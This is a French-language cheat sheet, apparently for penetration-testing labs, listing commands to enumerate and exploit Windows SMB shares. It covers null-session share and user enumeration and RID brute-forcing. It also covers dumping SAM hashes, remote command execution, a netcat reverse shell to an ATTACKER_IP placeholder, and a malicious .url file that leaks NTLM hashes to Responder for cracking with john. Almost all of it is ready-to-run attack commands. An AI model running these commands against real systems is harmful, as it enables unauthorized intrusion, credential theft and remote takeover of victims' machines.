# **SMB Enumeration & Exploitation Checklist**  

## üîç **√ânum√©ration & Connexion**
```bash
# Tester la session null
smbclient -N -U "" -L \\<IP>
smbclient -N -U "test" -L \\<IP>
smbclient -N -U "Guest" -L \\<IP>

# T√©l√©charger tous les fichiers d'un partage SMB
nxc smb $IP -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True

# √ânum√©rer les partages SMB
netexec smb $IP -u '' -p '' --shares

# Lister les utilisateurs SMB
netexec smb $IP -u '' -p '' --users | grep -E "SMB\s+.*\s+[A-Za-z]+\.[A-Za-z]+" | awk '{print $5}' > users.txt

# Bruteforce des RID pour d√©couvrir des utilisateurs suppl√©mentaires
netexec smb $IP -u '' -p '' --rid-brute

# Tester pour une ex√©cution de commande √† distance (RCE)
nxc smb $IP -u 'Administrator' -p 'P@ssw0rd' -x whoami
```

## üîì **Privil√®ges & Ex√©cution de commandes**
```bash
# R√©cup√©rer les hashes du SAM
nxc smb $IP -u 'UserName' -p 'PASSWORDHERE' --sam

# Extraire les hashes et les noms d'utilisateurs de secretsdump
grep -oP '^[^:]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' secretsdump.txt | awk -F: '{print $1}' > secretsdumpusernames.txt
grep -oP '^[^:]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}' secretsdump.txt | awk -F: '{print $4}' > secretsdumphashes.txt
```

## üìÇ **Transfert de fichiers**
```bash
# T√©l√©charger des fichiers depuis un partage SMB
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.184/Snaffler.exe

# Copier un fichier vers un partage SMB
smbclient \\\\$IP\\share -U "$USER" -P "$PASSWORD" -c "put /path/to/local/file /remote/path/remote_file.txt"
```

## üöÄ **Reverse Shell**
```bash
# D√©poser un reverse shell sur la cible via SMB
nxc smb $IP -u '$USER' -p '$PASSWORD' --put-file /path/to/nc.exe /tmp/nc.exe

# Lancer un reverse shell via netcat
nxc smb $IP -u '$USER' -p '$PASSWORD' -x "C:\tmp\nc.exe $ATTACKER_IP 1234 -e cmd"
```

## üîß **Exploitation suppl√©mentaire (G√©n√©rer URL malveillante et NTLM Hashing)**
<details>
<summary>READ WRITE perms</summary>

```bash
# Cloner hashgrab pour capturer des hashes NTLM
git clone https://github.com/xct/hashgrab.git
sudo responder -I tun0
python3 hashgrab.py <ip> <output>
```

Cr√©er un fichier URL malveillant :

```bash
[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\<kali_url>\%USERNAME%.icon
IconIndex=1
```

Lancer responder :

```bash
responder -I tun0 -wv
```

Ensuite, sur la machine cible, utiliser smbclient pour t√©l√©charger l'URL malveillante :

```bash
smb: \> put shell.url
```

Apr√®s avoir captur√© le hash NTLM via Responder, vous pouvez l'analyser avec cette commande :

```bash
# Exemple de capture NTLMv2-SSP hash
[SMB] NTLMv2-SSP Client   : 192.168.212.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:1122334455667788:3E3707D87E6C52CBAD58B5B494F109A0:...
```

Vous pouvez cracker le hash avec la commande suivante :

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash
```
</details>

## üö® **Autres attaques SMB**
```bash
# Tester pour l'acc√®s √† distance via SMB aux r√©pertoires partag√©s
smbclient -N -U "user" -L \\<IP>
```